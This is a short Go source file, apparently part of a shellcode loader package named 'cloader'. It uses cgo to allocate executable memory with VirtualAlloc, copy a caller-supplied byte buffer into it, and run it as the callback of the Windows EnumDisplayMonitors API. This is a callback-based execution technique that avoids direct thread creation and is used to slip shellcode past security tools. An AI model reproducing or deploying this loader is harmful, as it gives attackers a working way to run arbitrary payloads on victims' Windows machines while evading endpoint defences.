package cloader

/*
#include <windows.h>

void enumDisplayMonitors(uintptr_t p, int len) {
    LPVOID addr = VirtualAlloc(NULL, len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (addr) {
        RtlMoveMemory(addr, (void*)p, len);
        EnumDisplayMonitors(0, 0, (MONITORENUMPROC)addr, 0);
        VirtualFree(addr, 0, MEM_RELEASE);
    }
}
*/
import "C"
import "unsafe"

func EnumDisplayMonitors(p []byte) {
	C.enumDisplayMonitors((C.uintptr_t)(uintptr(unsafe.Pointer(&p[0]))), (C.int)(len(p)))
}
